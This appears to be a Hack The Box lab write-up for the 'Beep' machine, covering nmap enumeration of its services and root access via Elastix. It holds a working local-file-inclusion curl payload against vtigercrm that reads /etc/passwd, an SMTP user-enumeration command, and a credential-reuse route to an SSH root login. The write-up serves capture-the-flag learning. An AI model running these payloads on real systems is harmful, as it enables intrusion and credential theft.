# Beep

So, on initial nmap scan, we see a lot of ports open, so lets go through each of them in order, keeping http at last, since it probably has a wider attack surface

So, the smaller services enumeration has been done, and I've added the notes for these services in the below scan result inline, after this lets get into doing this for HTTP.

```text
srinivas@ubuntu:~/htb/beep$ cat beep.nmap 
# Nmap 7.80 scan initiated Sun Aug  1 12:34:26 2021 as: nmap -sS -sV -sC -oN beep.nmap 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.10s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
# some denial of service vulnerability here, nothing major

25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
# we can do user enumeration or something here, lets try that
# ran a smtp nmap scripts in the background, lets comeback here later
# perl -X smtp-user-enum.pl -M VRFY -U names.txt -t 10.10.10.7 - not much we got from here

80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS) # says this is centos
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL USER EXPIRE(NEVER) LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) APOP TOP STLS AUTH-RESP-CODE PIPELINING RESP-CODES
# none of these versions seem to be vulnerable or anything

111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: QUOTA IMAP4rev1 MULTIAPPEND UIDPLUS NO OK ATOMIC ID RIGHTS=kxte X-NETSCAPE LIST-SUBSCRIBED IMAP4 LISTEXT ACL IDLE THREAD=REFERENCES LITERAL+ CHILDREN NAMESPACE BINARY RENAME THREAD=ORDEREDSUBJECT UNSELECT ANNOTATEMORE SORT SORT=MODSEQ MAILBOX-REFERRALS STARTTLS CONDSTORE URLAUTHA0001 CATENATE Completed
# to do this as well

443/tcp   open  ssl/https?
|_ssl-date: 2021-08-01T19:37:45+00:00; -1s from scanner time.

880/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
# take a look if nothing works

10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
# looks like if we get some creds this would work

Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: -1s
```

So, the web server says that it supports a lower version of TLS, so lets try to get our browser to work with the lower versions of TLS. to do that, we need to change the TLS min version in firefox, which we can obtain how to do if we do a quick google on that.

we have quite some hits from the ffuf scan we did on the server after we enabled lower TLS versions from the command line. lets go through them

```text
# nothing much under here just some static php files
https://beep.localdomain/configs/

# similar above result for /robots.txt, /var/backups/, /var/cache/

# going on this show us that we are on some sort of mail server
# this has some stuff in EDB, but nothing major just some XSS related
https://beep.localdomain/mail/

# and if we look at the headers we obtain from this results, it clues us that
# it is a software called elastix - elastixSession=to9j1kqfdh6356er8b7b5h0d36

https://www.exploit-db.com/exploits/37637 - elastix LFI, we get to read some files
so we got an user called fanis from here, lets add him and root to our users file
curl https://beep.localdomain/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00\&module=Accounts\&action -k
```

I try to read some more files, but no luck at here, so I've looked at the example conf file thats given in the EDB POC, which seems to have some interesting data and bingo, it has a bunch of usernames and password, although most of the passwords looks like they are one and same. Now I try to run Hydra, but it doesn't give us anything because of the older ssh version.

manually doing ssh after adding the following in the ~/.ssh/config file worked and we are root

```text
Host 10.10.10.7
    Ciphers 3des-cbc
    KexAlgorithms +diffie-hellman-group1-sha1
```

